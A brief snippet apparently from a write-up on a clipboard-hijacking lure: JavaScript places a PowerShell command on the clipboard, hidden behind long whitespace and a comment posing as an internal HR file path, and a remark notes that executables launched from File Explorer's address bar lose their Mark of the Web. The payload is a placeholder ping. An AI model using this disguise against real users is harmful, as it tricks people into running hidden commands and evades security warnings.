```ps1
navigator.clipboard.writeText("Powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    ");
```

Executable files (e.g. .exe) executed through the File Explorerâ€™s address bar have their Mark of The Web (MOTW) attribute removed.
